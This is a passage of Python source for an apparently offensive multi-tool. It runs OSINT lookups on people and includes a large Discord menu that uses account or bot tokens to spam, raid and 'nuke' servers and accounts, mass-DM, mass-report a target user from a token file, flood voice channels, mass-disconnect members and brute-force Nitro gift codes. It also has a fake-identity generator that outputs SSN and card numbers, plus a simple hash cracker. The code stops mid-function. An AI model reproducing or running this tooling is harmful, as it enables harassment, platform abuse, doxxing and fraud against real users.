    _scrape_social("TIKTOK", "https://tiktok.com/@{u}", {
        "Followers": r'"followerCount":(\d+)', "Likes": r'"heartCount":(\d+)',
        "Nickname": r'"nickname":"([^"]+)"', "Region": r'"region":"([^"]+)"'}, "TikTok")
def o_snap():
    _scrape_social("SNAPCHAT", "https://snapchat.com/add/{u}", {
        "display": r'"display_name":"([^"]+)"', "score": r'"snap_score":(\d+)',
        "subs": r'"subscriber_count":(\d+)'}, "Snap")
def o_tw():
    _scrape_social("TWITTER/X", "https://nitter.privacydev.net/{u}", {
        "Name": r'<a class="profile-card-fullname"[^>]*>([^<]+)<',
        "Bio": r'<div class="profile-bio"[^>]*><p>([^<]+)<'}, "Twitter")
def o_face():
    banner_s("FACE RECON"); url = ask("Image URL:")
    if not url.startswith("http"): pause(); return
    q = urllib.parse.quote(url)
    for n, u in [("Google Lens", f"https://lens.google.com/uploadbyurl?url={q}"),
                 ("Yandex", f"https://yandex.com/images/search?rpt=imageview&url={q}"),
                 ("Bing", f"https://bing.com/images/search?q=imgurl:{q}"),
                 ("TinEye", f"https://tineye.com/search?url={q}"),
                 ("FaceCheck", f"https://facecheck.id/#?url={q}")]:
        print(f"  {G}[{n}]{RST} {DIM}{u[:90]}{RST}")
    _hist_log("OSINT","Face",url[:40]); pause()
def o_steam():
    banner_s("STEAM ID"); raw = ask("SteamID64:")
    try:
        if raw.isdigit() and len(raw) == 17:
            sid64 = int(raw); sid32 = sid64 - 76561197960265728
            txt = f"SteamID64: {sid64}\nSTEAM_0:{sid32 % 2}:{sid32 // 2}\n[U:1:{sid32}]"
            print(f"\n  {Y}SteamID64{RST}: {sid64}")
            print(f"  {Y}SteamID{RST}  : STEAM_0:{sid32 % 2}:{sid32 // 2}")
            print(f"  {Y}Profile{RST}  : https://steamcommunity.com/profiles/{sid64}")
            _hist_log("OSINT","Steam",raw); clip_pause(txt)
    except Exception as e: print(f"{ERR} {e}"); pause()
def o_shodan():
    banner_s("SHODAN"); t = ask("Target:")
    for u in [f"https://shodan.io/search?query=hostname%3A{t}",
              f"https://shodan.io/search?query=ip%3A{t}",
              f"https://shodan.io/search?query=org%3A{t}", f"https://shodan.io/host/{t}"]:
        print(f"  {G}→{RST} {DIM}{u}{RST}")
    _hist_log("OSINT","Shodan",t); pause()
def o_whois():
    banner_s("WHOIS"); d = ask("Domain:")
    try:
        import whois as w
        data = w.whois(d)
        print(f"  {Y}Registrar{RST}: {data.registrar}")
        print(f"  {Y}Created{RST}  : {data.creation_date}")
        print(f"  {Y}Expires{RST}  : {data.expiration_date}")
        _hist_log("OSINT","WHOIS",d)
    except ImportError: _pip("python-whois"); print(f"{INF} Relance.")
    except Exception as e: print(f"{ERR} {e}")
    pause()
def o_ipgeo():
    banner_s("IP GEO+"); ip = ask("IP (empty=yours):")
    if not ip:
        try: ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        except Exception: pass
    if not ip: pause(); return
    for name, u in [("ip-api", f"http://ip-api.com/json/{ip}?fields=66846719"),
                    ("ipinfo", f"https://ipinfo.io/{ip}/json"),
                    ("freeipapi", f"https://freeipapi.com/api/json/{ip}")]:
        d = jget(u)
        if isinstance(d, dict) and "error" not in d:
            print(f"  {MID}-- {name} --{RST}")
            for k, v in list(d.items())[:12]:
                print(f"    {Y}{str(k):<16}{RST} {W}{str(v)[:70]}{RST}")
            print()
    _hist_log("OSINT","IPGeo",ip); clip_pause(ip)
def o_github():
    banner_s("GITHUB"); u = ask("Username:").strip().lstrip("@")
    try:
        r = requests.get(f"https://api.github.com/users/{u}", timeout=8, headers={"User-Agent":"Mozilla/5.0"})
        if r.status_code != 200: print(f"{ERR} {T('not_found')}"); pause(); return
        d = r.json()
        for k in ["login","name","id","company","blog","location","email","bio",
                  "twitter_username","public_repos","followers","following","created_at"]:
            if d.get(k) not in (None,"",0): print(f"  {Y}{k:<18}{RST} {W}{d[k]}{RST}")
        repos = requests.get(f"https://api.github.com/users/{u}/repos?sort=updated&per_page=10",
                             timeout=8, headers={"User-Agent":"Mozilla/5.0"}).json()
        if isinstance(repos, list):
            print(f"\n  {MID}-- Latest repos --{RST}")
            for rp in repos[:10]:
                print(f"  {G}{rp['name']:<30}{RST} {DIM}{rp.get('language','?')} · ★{rp.get('stargazers_count',0)}{RST}")
        _hist_log("OSINT","GitHub",u)
    except Exception as e: print(f"{ERR} {e}")
    pause()

# ========================================================================
# DISCORD
# ========================================================================
def _dh(t): return {"Authorization": t, "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
def _dreq(method, path, token, **kw):
    kw.setdefault("timeout", 8)
    return getattr(requests, method)(f"https://discord.com/api/v9{path}", headers=_dh(token), **kw)

def discord_menu():
    while True:
        menu_box("DISCORD", [
            ("1","Token Info"),("2","Token Nuker"),("3","Spammer"),("4","Joiner"),
            ("5","Leaver"),("6","Status"),("7","Del Friends"),("8","Block Friends"),
            ("9","Mass DM"),("10","Del DMs"),("11","Raid"),("12","Token Gen"),
            ("13","Webhook Info"),("14","Webhook Del"),("15","Webhook Spam"),
            ("16","Webhook Gen"),("17","Bot Nuke"),("18","Server Info"),("19","Nitro Gen"),
            ("20","Friend Spam"),("21","Channel Spam"),("22","Reaction Spam"),
            ("23","Guilds"),("24","Friends"),("25","Bio"),("26","Avatar"),
            ("27","Banner"),("28","HypeSquad"),("29","Onliner"),("30","Tok→ID"),
            ("31","Mass Report"),("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        fns = {"1": dc_info, "2": dc_nuker, "3": dc_spam, "4": dc_join, "5": dc_leave,
               "6": dc_status, "7": dc_delf, "8": dc_blockf, "9": dc_mass_dm,
               "10": dc_del_dm, "11": dc_raid, "12": dc_tokgen, "13": dc_wh_info,
               "14": dc_wh_del, "15": dc_wh_spam, "16": dc_wh_gen, "17": dc_bot_nuke,
               "18": dc_srv_info, "19": dc_nitro, "20": dc_fr_spam, "21": dc_ch_spam,
               "22": dc_rx_spam, "23": dc_guilds, "24": dc_friends, "25": dc_bio,
               "26": lambda: _dc_setimg("avatar"), "27": lambda: _dc_setimg("banner"),
               "28": dc_hs, "29": dc_online, "30": dc_t2id, "31": dc_report}
        fn = fns.get(c)
        if fn: fn()
        elif c == "0": break

def dc_info():
    banner_s("TOKEN INFO"); t = ask("Token:")
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=_dh(t), timeout=8)
        if r.status_code != 200: print(f"{ERR} {T('invalid')}"); pause(); return
        d = r.json()
        gs = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=_dh(t), timeout=8).json()
        bl = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=_dh(t), timeout=8).json()
        for k, v in [("ID",d.get("id")),("Username",d.get("username")),("Email",d.get("email")),
                     ("Phone",d.get("phone")),("Nitro",d.get("premium_type")),
                     ("MFA",d.get("mfa_enabled")),("Guilds",len(gs) if isinstance(gs,list) else 0),
                     ("Billing",len(bl) if isinstance(bl,list) else 0)]:
            print(f"  {Y}{k:<10}{RST} {W}{v}{RST}")
        _hist_log("DC","Info",d.get("username","?"))
    except Exception as e: print(f"{ERR} {e}")
    pause()
def dc_nuker():
    banner_s("TOKEN NUKER"); t = ask("Token:")
    if ask("Type NUKE:") != "NUKE": pause(); return
    try:
        gs = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=_dh(t), timeout=8).json()
        n = 0
        for g in (gs if isinstance(gs, list) else []):
            ep = f"guilds/{g['id']}" if g.get("owner") else f"users/@me/guilds/{g['id']}"
            r = requests.delete(f"https://discord.com/api/v9/{ep}", headers=_dh(t), timeout=8)
            print(f"  {Y}[{r.status_code}]{RST} {g['name']}"); time.sleep(0.3); n += 1
        fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=_dh(t), timeout=8).json()
        for f in (fs if isinstance(fs, list) else []):
            requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{f['id']}", headers=_dh(t), timeout=8)
            time.sleep(0.2)
        print(f"\n{OK} Nuke done ({n})."); _hist_log("DC","Nuke",str(n))
    except Exception as e: print(f"{ERR} {e}")
    pause()
def dc_spam():
    banner_s("SPAM"); t = ask("Token:"); ch = ask("Channel ID:"); m = ask("Message:")
    n = ask_int("Count:", 10); d = float(ask("Delay:", "0.5"))
    for i in range(1, n + 1):
        r = _dreq("post", f"/channels/{ch}/messages", t, json={"content": m})
        print(f"  {G if r.status_code == 200 else R}[{i}/{n}]{RST} {r.status_code}"); time.sleep(d)
    _hist_log("DC","Spam",str(n)); pause()
def dc_join():
    banner_s("JOIN"); t = ask("Token:"); inv = ask("Invite:").split("/")[-1]
    r = _dreq("post", f"/invites/{inv}", t, json={})
    print(f"{OK if r.status_code == 200 else ERR} {r.status_code}"); _hist_log("DC","Join",inv); pause()
def dc_leave():
    banner_s("LEAVE"); t = ask("Token:"); g = ask("Server ID:")
    r = _dreq("delete", f"/users/@me/guilds/{g}", t)
    print(f"{OK if r.status_code == 204 else ERR} {r.status_code}"); _hist_log("DC","Leave",g); pause()
def dc_status():
    banner_s("STATUS"); t = ask("Token:"); s = ask("[1]online [2]idle [3]dnd [4]invisible:", "1")
    smap = {"1":"online","2":"idle","3":"dnd","4":"invisible"}
    p = {"status": smap.get(s, "online")}
    c = ask("Custom text:", "")
    if c: p["custom_status"] = {"text": c}
    r = _dreq("patch", "/users/@me/settings", t, json=p)
    print(f"{OK if r.status_code == 200 else ERR} {r.status_code}"); _hist_log("DC","Status",smap.get(s,"?")); pause()
def dc_delf():
    banner_s("DEL FRIENDS"); t = ask("Token:")
    if ask("Type CONFIRM:") != "CONFIRM": pause(); return
    fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=_dh(t), timeout=8).json()
    n = 0
    for f in (fs if isinstance(fs, list) else []):
        requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{f['id']}", headers=_dh(t), timeout=8)
        print(f"  {R}[DEL]{RST} {f.get('user',{}).get('username','?')}"); time.sleep(0.3); n += 1
    _hist_log("DC","DelFriends",str(n)); pause()
def dc_blockf():
    banner_s("BLOCK FRIENDS"); t = ask("Token:")
    fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=_dh(t), timeout=8).json()
    n = 0
    for f in (fs if isinstance(fs, list) else []):
        if f.get("type") == 1:
            requests.put(f"https://discord.com/api/v9/users/@me/relationships/{f['user']['id']}",
                         headers=_dh(t), json={"type": 2}, timeout=8)
            print(f"  {R}[BLOCK]{RST} {f['user']['username']}"); time.sleep(0.3); n += 1
    _hist_log("DC","BlockFriends",str(n)); pause()
def dc_mass_dm():
    banner_s("MASS DM"); t = ask("Token:"); m = ask("Message:"); ids = ask("User IDs (comma):").split(",")
    for uid in ids:
        uid = uid.strip()
        if not uid: continue
        dm = _dreq("post", "/users/@me/channels", t, json={"recipient_id": uid})
        if dm.status_code == 200:
            r = _dreq("post", f"/channels/{dm.json()['id']}/messages", t, json={"content": m})
            print(f"  {G if r.status_code == 200 else R}[{uid}]{RST} {r.status_code}")
        time.sleep(0.6)
    _hist_log("DC","MassDM",str(len(ids))); pause()
def dc_del_dm():
    banner_s("DEL DMs"); t = ask("Token:")
    dms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=_dh(t), timeout=8).json()
    n = 0
    for dm in (dms if isinstance(dms, list) else []):
        requests.delete(f"https://discord.com/api/v9/channels/{dm['id']}", headers=_dh(t), timeout=8)
        print(f"  {R}[DEL]{RST} {dm['id']}"); time.sleep(0.3); n += 1
    _hist_log("DC","DelDMs",str(n)); pause()
def dc_raid():
    banner_s("RAID"); t = ask("Token:"); g = ask("Server ID:"); ch = ask("Channel ID:")
    m = ask("Message:"); n = ask_int("Count:", 20)
    for i in range(3): _dreq("post", f"/guilds/{g}/channels", t, json={"name": f"raided-{i}", "type": 0})
    for i in range(1, n + 1):
        r = _dreq("post", f"/channels/{ch}/messages", t, json={"content": f"@everyone {m}"})
        print(f"  {G if r.status_code == 200 else R}[{i}/{n}]{RST}"); time.sleep(0.3)
    _hist_log("DC","Raid",f"{g} x{n}"); pause()
def dc_tokgen():
    banner_s("TOKEN GEN"); n = ask_int("Count:", 10)
    chars = string.ascii_letters + string.digits + "-_"; toks = []
    for _ in range(n):
        p1 = base64.b64encode(str(random.randint(10**17, 10**18)).encode()).decode().rstrip("=")
        t = f"{p1}.{''.join(random.choices(chars, k=6))}.{''.join(random.choices(chars, k=27))}"
        print(f"  {Y}{t}{RST}"); toks.append(t)
    out("tokens_gen.txt", "\n".join(toks)); _hist_log("DC","TokGen",str(n)); pause()
def dc_wh_info():
    banner_s("WEBHOOK INFO"); wh = ask("Webhook URL:"); d = jget(wh); pkv(d)
    _hist_log("DC","WhInfo",wh[:40]); pause()
def dc_wh_del():
    banner_s("WEBHOOK DEL"); r = requests.delete(ask("Webhook URL:"), timeout=8)
    print(f"{OK if r.status_code == 204 else ERR} {r.status_code}"); _hist_log("DC","WhDel","ok"); pause()
def dc_wh_spam():
    banner_s("WEBHOOK SPAM"); wh = ask("Webhook:"); m = ask("Message:"); n = ask_int("Count:", 10)
    for i in range(1, n + 1):
        r = requests.post(wh, json={"content": m}, timeout=8)
        print(f"  {G if r.status_code == 204 else R}[{i}/{n}]{RST}"); time.sleep(0.5)
    _hist_log("DC","WhSpam",str(n)); pause()
def dc_wh_gen():
    banner_s("WEBHOOK GEN"); t = ask("Token:"); ch = ask("Channel ID:")
    nm = ask("Name:", "c6R6"); n = ask_int("Count:", 3); hooks = []
    for i in range(n):
        r = _dreq("post", f"/channels/{ch}/webhooks", t, json={"name": f"{nm}-{i}"})
        if r.status_code == 200: u = r.json().get("url"); print(f"  {G}[OK]{RST} {u}"); hooks.append(u)
        time.sleep(0.4)
    if hooks: out("webhooks_created.txt", "\n".join(hooks))
    _hist_log("DC","WhGen",str(len(hooks))); pause()
def dc_bot_nuke():
    banner_s("BOT NUKE"); t = ask("Bot Token:"); g = ask("Server ID:")
    if ask("Type NUKE:") != "NUKE": pause(); return
    h = {"Authorization": f"Bot {t}", "Content-Type": "application/json"}
    chs = requests.get(f"https://discord.com/api/v9/guilds/{g}/channels", headers=h, timeout=8).json()
    n = 0
    for c in (chs if isinstance(chs, list) else []):
        requests.delete(f"https://discord.com/api/v9/channels/{c['id']}", headers=h, timeout=8)
        print(f"  {R}[DEL]{RST} {c['name']}"); time.sleep(0.3); n += 1
    _hist_log("DC","BotNuke",str(n)); pause()
def dc_srv_info():
    banner_s("SERVER INFO"); t = ask("Token:"); g = ask("Server ID:")
    d = requests.get(f"https://discord.com/api/v9/guilds/{g}?with_counts=true", headers=_dh(t), timeout=8).json()
    for k in ["name","owner_id","approximate_member_count","approximate_presence_count","premium_tier"]:
        print(f"  {Y}{k:<28}{RST} {W}{d.get(k)}{RST}")
    _hist_log("DC","SrvInfo",d.get("name","?")); pause()
def dc_nitro():
    banner_s("NITRO GEN"); n = ask_int("Count:", 10); check = ask("Check? (y/n):", "n").lower() == "y"
    chars = string.ascii_letters + string.digits; valid = []
    for i in range(1, n + 1):
        code = "".join(random.choices(chars, k=16)); url = f"https://discord.gift/{code}"
        if check:
            r = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}", timeout=4)
            ok = r.status_code == 200
            print(f"  {G if ok else R}[{'VALID' if ok else 'INVALID'}]{RST} {url}")
            if ok: valid.append(url)
        else: print(f"  {Y}{url}{RST}"); valid.append(url)
        time.sleep(0.15)
    if valid: out("nitro_gen.txt", "\n".join(valid))
    _hist_log("DC","Nitro",str(len(valid))); pause()
def dc_fr_spam():
    banner_s("FRIEND SPAM"); t = ask("Token:"); m = ask("Message:"); n = 0
    fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=_dh(t), timeout=8).json()
    for f in (fs if isinstance(fs, list) else []):
        if f.get("type") == 1:
            dm = _dreq("post", "/users/@me/channels", t, json={"recipient_id": f['user']['id']})
            if dm.status_code == 200:
                _dreq("post", f"/channels/{dm.json()['id']}/messages", t, json={"content": m})
                print(f"  {G}[DM]{RST} {f['user']['username']}"); n += 1
            time.sleep(0.6)
    _hist_log("DC","FrSpam",str(n)); pause()
def dc_ch_spam():
    banner_s("CHANNEL SPAM"); t = ask("Token:"); ch = ask("Channel ID:")
    m = ask("Message:", "@everyone c6R6"); n = ask_int("Count:", 20)
    for i in range(1, n + 1):
        r = _dreq("post", f"/channels/{ch}/messages", t, json={"content": m})
        print(f"  {G if r.status_code == 200 else R}[{i}/{n}]{RST}"); time.sleep(0.3)
    _hist_log("DC","ChSpam",str(n)); pause()
def dc_rx_spam():
    banner_s("REACTION SPAM"); t = ask("Token:"); ch = ask("Channel ID:"); mid = ask("Message ID:")
    em = urllib.parse.quote(ask("Emoji:")); n = ask_int("Count:", 10)
    for i in range(1, n + 1):
        r = _dreq("put", f"/channels/{ch}/messages/{mid}/reactions/{em}/@me", t)
        print(f"  {G if r.status_code == 204 else R}[{i}/{n}]{RST}"); time.sleep(0.3)
    _hist_log("DC","RxSpam",str(n)); pause()
def dc_guilds():
    banner_s("GUILDS")
    r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=_dh(ask("Token:")), timeout=8).json()
    if isinstance(r, list):
        for g in r:
            tag = f"{G}[OWN]{RST}" if g.get("owner") else f"{DIM}[MBR]{RST}"
            print(f"  {tag} {g['name']:<28} {DIM}{g['id']}{RST}")
    _hist_log("DC","Guilds","ok"); pause()
def dc_friends():
    banner_s("FRIENDS")
    r = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=_dh(ask("Token:")), timeout=8).json()
    if isinstance(r, list):
        for f in r:
            u = f.get("user", {}); print(f"  {G}[{f.get('type')}]{RST} {u.get('username')} {DIM}{u.get('id')}{RST}")
    _hist_log("DC","Friends","ok"); pause()
def dc_bio():
    banner_s("BIO"); r = _dreq("patch", "/users/@me", ask("Token:"), json={"bio": ask("Bio:")})
    print(f"{OK if r.status_code == 200 else ERR} {r.status_code}"); _hist_log("DC","Bio","ok"); pause()
def _dc_setimg(kind):
    banner_s(f"{kind.upper()} CHANGER"); t = ask("Token:"); p = ask("Image path:")
    try:
        with open(p, "rb") as f: data = f.read()
        ext = os.path.splitext(p)[1].lower().replace(".", "") or "png"
        r = _dreq("patch", "/users/@me", t,
                  json={kind: f"data:image/{ext};base64,{base64.b64encode(data).decode()}"})
        print(f"{OK if r.status_code == 200 else ERR} {r.status_code}"); _hist_log("DC",kind,p)
    except Exception as e: print(f"{ERR} {e}")
    pause()
def dc_hs():
    banner_s("HYPESQUAD"); t = ask("Token:"); h = ask("[1]Bravery [2]Brilliance [3]Balance:", "1")
    r = _dreq("post", "/hypesquad/online", t, json={"house_id": int(h)})
    print(f"{OK if r.status_code == 204 else ERR} {r.status_code}"); _hist_log("DC","HS",h); pause()
def dc_online():
    banner_s("ONLINER"); t = ask("Token:"); d = ask_int("Duration (0=inf):", 0)
    h = _dh(t); start = time.time(); c = 0
    try:
        while True:
            requests.get("https://discord.com/api/v9/users/@me", headers=h, timeout=5); c += 1
            el = int(time.time() - start)
            print(f"\r  {G}[ONLINE]{RST} ping #{c} {el}s", end=" ")
            if d > 0 and el >= d: break
            time.sleep(30)
    except KeyboardInterrupt: pass
    print(f"\n\n{OK} {c} pings."); _hist_log("DC","Online",str(c)); pause()
def dc_t2id():
    banner_s("TOKEN → ID"); t = ask("Token:")
    try:
        p1 = t.split(".")[0]; p1 += "=" * ((4 - len(p1) % 4) % 4)
        uid = base64.b64decode(p1).decode()
        ts = (int(uid) >> 22) + 1420070400000
        print(f"\n  {Y}User ID{RST}: {G}{uid}{RST}")
        print(f"  {Y}Created{RST}: {datetime.fromtimestamp(ts / 1000)}")
        _hist_log("DC","T→ID",uid); clip_pause(uid)
    except Exception as e: print(f"{ERR} {e}"); pause()
def dc_report():
    banner_s("MASS REPORT"); fp = ask("Tokens file:")
    if not os.path.isfile(fp): print(f"{ERR} {T('not_found')}"); pause(); return
    tid = ask("User ID:"); tokens = [l.strip() for l in open(fp, errors="ignore") if l.strip()]
    s = 0
    for tk in tokens:
        try:
            r = requests.post(f"https://discord.com/api/v9/reporting/user/{tid}", headers=_dh(tk),
                              json={"version":"1.0","variant":"1","language":"en",
                                    "breadcrumbs":[0],"elements":{},"name":"human_profile"}, timeout=5)
            if r.status_code in (200,201,204): s += 1
            print(f"  {G if r.status_code in (200,201,204) else R}[{r.status_code}]{RST}")
        except Exception: pass
        time.sleep(0.5)
    print(f"\n{OK} {s}/{len(tokens)}."); _hist_log("DC","MassReport",f"{s}/{len(tokens)}"); pause()

# ========================================================================
# VC
# ========================================================================
def _vc_join(t, g, c, hold=3):
    try: import websocket
    except ImportError: _pip("websocket-client"); import websocket
    ws = None; stop = {"v": False}
    try:
        ws = websocket.create_connection("wss://gateway.discord.gg/?v=9&encoding=json", timeout=10)
        hb = 45.0
        try: hb = json.loads(ws.recv())["d"]["heartbeat_interval"] / 1000
        except Exception: pass
        def hf():
            while not stop["v"]:
                try: ws.send(json.dumps({"op": 1, "d": None}))
                except Exception: return
                time.sleep(hb)
        threading.Thread(target=hf, daemon=True).start()
        ws.send(json.dumps({"op": 2, "d": {"token": t,
            "properties": {"$os": "Windows", "$browser": "Chrome", "$device": "PC"}, "compress": False}}))
        for _ in range(30):
            try:
                if json.loads(ws.recv()).get("t") == "READY": break
            except Exception: break
        ws.send(json.dumps({"op": 4, "d": {"guild_id": g, "channel_id": c,
            "self_mute": False, "self_deaf": False}}))
        time.sleep(hold)
        ws.send(json.dumps({"op": 4, "d": {"guild_id": g, "channel_id": None,
            "self_mute": False, "self_deaf": False}}))
        time.sleep(0.5); return True, "ok"
    except Exception as e: return False, str(e)
    finally:
        stop["v"] = True
        if ws:
            try: ws.close()
            except Exception: pass

def vc_menu():
    while True:
        menu_box("VC DISCORD", [
            ("1","VC Joiner"),("2","VC Spammer"),("3","VC Mass"),
            ("4","VC List"),("5","Mute All"),("6","Disconnect All"),
            ("7","Move All"),("8","Flood"),("9","Screenshare"),("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        fns = {"1": vc_join, "2": vc_spam, "3": vc_mass, "4": vc_list,
               "5": lambda: _vc_bot_action("MUTE ALL", "mute"),
               "6": lambda: _vc_bot_action("DISCONNECT ALL", "disconnect"),
               "7": lambda: _vc_bot_action("MOVE ALL", "move"),
               "8": vc_flood, "9": vc_share}
        fn = fns.get(c)
        if fn: fn()
        elif c == "0": break
def vc_join():
    banner_s("VC JOIN"); ok_, msg = _vc_join(ask("Token:"), ask("Server ID:"), ask("Channel ID:"), 5)
    print(f"{OK if ok_ else ERR} {msg}"); _hist_log("VC","Join","ok" if ok_ else msg[:30]); pause()
def vc_spam():
    banner_s("VC SPAM"); t = ask("Token:"); g = ask("Server ID:"); c = ask("Channel ID:")
    n = ask_int("Count:", 10); d = float(ask("Delay:", "1"))
    for i in range(1, n + 1):
        ok_, _ = _vc_join(t, g, c, max(0.5, d))
        print(f"  {G if ok_ else R}[{i}/{n}]{RST}"); time.sleep(d)
    _hist_log("VC","Spam",str(n)); pause()
def vc_mass():
    banner_s("VC MASS"); p = ask("Tokens file:")
    if not os.path.isfile(p): print(f"{ERR} {T('not_found')}"); pause(); return
    tks = [l.strip() for l in open(p, errors="ignore") if l.strip()]
    g = ask("Server ID:"); c = ask("Channel ID:")
    for i, t in enumerate(tks, 1):
        ok_, _ = _vc_join(t, g, c, 2); print(f"  {G if ok_ else R}[{i}/{len(tks)}]{RST}")
    _hist_log("VC","Mass",str(len(tks))); pause()
def vc_list():
    banner_s("VC LIST"); t = ask("Token:"); g = ask("Server ID:")
    chs = requests.get(f"https://discord.com/api/v9/guilds/{g}/channels", headers=_dh(t), timeout=8).json()
    if isinstance(chs, list):
        for c in chs:
            if c.get("type") in (2, 13): print(f"  {G}[VC]{RST} {c['name']:<25} {DIM}{c['id']}{RST}")
    _hist_log("VC","List",g); pause()
def _vc_bot_action(label, action):
    banner_s(label); t = ask("Bot Token:"); g = ask("Server ID:")
    if action == "disconnect" and ask("Type DISCONNECT:") != "DISCONNECT": pause(); return
    dest = ask("Dest channel ID:") if action == "move" else None
    mute_a = ask("[1]M [2]D [3]Both:", "1") if action == "mute" else None
    h = {"Authorization": f"Bot {t}", "Content-Type": "application/json"}
    ms = requests.get(f"https://discord.com/api/v9/guilds/{g}/members?limit=1000", headers=h, timeout=8).json()
    n = 0
    for m in (ms if isinstance(ms, list) else []):
        p = {}
        if action == "mute":
            if mute_a in ("1","3"): p["mute"] = True
            if mute_a in ("2","3"): p["deaf"] = True
        elif action == "disconnect": p = {"channel_id": None}
        elif action == "move": p = {"channel_id": dest}
        requests.patch(f"https://discord.com/api/v9/guilds/{g}/members/{m['user']['id']}", headers=h, json=p, timeout=8)
        print(f"  {G}[{action.upper()}]{RST} {m['user']['username']}"); time.sleep(0.2); n += 1
    _hist_log("VC", label, str(n)); pause()
def vc_flood():
    banner_s("VC FLOOD"); t = ask("Token:"); g = ask("Server ID:"); n = ask_int("Count:", 10)
    bot = ask("Bot token? (y/n):", "n").lower() in ("y","o")
    h = {"Authorization": f"Bot {t}", "Content-Type": "application/json"} if bot else _dh(t)
    for i in range(1, n + 1):
        r = requests.post(f"https://discord.com/api/v9/guilds/{g}/channels", headers=h,
                          json={"name": f"c6r6-{i}", "type": 2, "bitrate": 64000}, timeout=8)
        print(f"  {G if r.status_code == 201 else R}[{i}/{n}]{RST} {r.status_code}"); time.sleep(0.3)
    _hist_log("VC","Flood",str(n)); pause()
def vc_share():
    banner_s("VC SCREENSHARE"); ok_, msg = _vc_join(ask("Token:"), ask("Server ID:"), ask("Channel ID:"), 5)
    print(f"{OK if ok_ else ERR} {msg}"); _hist_log("VC","Share","ok" if ok_ else msg[:30]); pause()

# ========================================================================
# UTILITIES
# ========================================================================
def util_menu():
    while True:
        menu_box("UTILITIES", [
            ("1","Hasher"),("2","Password Gen"),("3","IP Gen"),("4","Base64"),
            ("5","XOR"),("6","Fake ID"),("7","Hash Cracker"),("8","Dark Web"),
            ("9","UUID"),("10","MAC Gen"),("11","JWT Decode"),("12","Text Conv"),
            ("13","DB Search"),("14","Caesar"),("15","Zip Crack"),("16","Proxy Gen"),
            ("17","Base Conv"),("18","Regex"),("19","Temp Mail"),("20","PW Strength"),
            ("21","QR Gen"),("22","Color Conv"),("23","Tor"),("24","Sig Scanner"),
            ("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        fns = {"1": u_hash, "2": u_pass, "3": u_ip, "4": u_b64, "5": u_xor,
               "6": u_fake, "7": u_crack, "8": u_dark, "9": u_uuid, "10": u_mac,
               "11": u_jwt, "12": u_conv, "13": u_dbs, "14": u_caesar, "15": u_zip,
               "16": u_proxy, "17": u_baseconv, "18": u_regex, "19": u_tempmail,
               "20": u_pwstrength, "21": u_qr, "22": u_color, "23": u_tor, "24": u_sigscan}
        fn = fns.get(c)
        if fn: fn()
        elif c == "0": break
def u_hash():
    banner_s("HASHER"); t = ask("Text:")
    if not t: pause(); return
    res = []
    for a in ["md5","sha1","sha256","sha512"]:
        h = hashlib.new(a, t.encode()).hexdigest(); print(f"  {Y}{a:<8}{RST} {W}{h}{RST}"); res.append(f"{a}: {h}")
    _hist_log("UTIL","Hash",t[:30]); clip_pause("\n".join(res))
def u_pass():
    banner_s("PASSWORD GEN"); l = ask_int("Length:", 16); n = ask_int("Count:", 10)
    pool = string.ascii_letters + string.digits + "!@#$%^&*"; pwds = []
    for _ in range(n):
        p = ''.join(random.choices(pool, k=l)); print(f"  {G}→{RST} {W}{p}{RST}"); pwds.append(p)
    _hist_log("UTIL","Pass",f"{n}x{l}"); clip_pause("\n".join(pwds))
def u_ip():
    banner_s("IP GEN"); ips = []
    for _ in range(ask_int("Count:", 10)):
        ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
        print(f"  {G}→{RST} {ip}"); ips.append(ip)
    _hist_log("UTIL","IPGen",str(len(ips))); clip_pause("\n".join(ips))
def u_b64():
    banner_s("BASE64"); m = ask("(e)ncode/(d)ecode:", "e"); t = ask("Input:")
    try:
        r = base64.b64encode(t.encode()).decode() if m == "e" else base64.b64decode(t).decode()
        print(f"\n{OK} {G}{r}{RST}"); _hist_log("UTIL","B64",m); clip_pause(r)
    except Exception as e: print(f"{ERR} {e}"); pause()
def u_xor():
    banner_s("XOR"); t = ask("Text:"); k = ask("Key:")
    if not k: pause(); return
    o = "".join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(t))
    r = base64.b64encode(o.encode('latin-1')).decode()
    print(f"\n{OK} {G}{r}{RST}"); _hist_log("UTIL","XOR",t[:20]); clip_pause(r)
def u_fake():
    banner_s("FAKE ID")
    fm = ["James","Michael","David","Alex","Ryan"]; ff = ["Emma","Olivia","Sophia","Ava","Isabella"]
    ln = random.choice(["Smith","Johnson","Williams","Brown","Davis"])
    fn = random.choice(fm if random.choice(["M","F"]) == "M" else ff)
    txt = (f"Name: {fn} {ln}\nEmail: {fn.lower()}.{ln.lower()}{random.randint(10,99)}@gmail.com\n"
           f"Phone: +1{random.randint(200,999)}{random.randint(1000000,9999999)}\n"
           f"DOB: {random.randint(1985,2004)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}\n"
           f"SSN: {random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}\n"
           f"CC: 4{random.randint(100000000000000,999999999999999)}")
    for l in txt.split("\n"):
        a, b = l.split(":", 1); print(f"  {Y}{a}{RST}:{b}")
    _hist_log("UTIL","FakeID",fn); clip_pause(txt)
def u_crack():
    banner_s("HASH CRACK"); target = ask("Hash:").lower()
    for w in ["password","123456","admin","qwerty","letmein","welcome","monkey","abc123","1234","iloveyou","sunshine"]:
        for a in ["md5","sha1","sha256"]:
            if hashlib.new(a, w.encode()).hexdigest() == target:
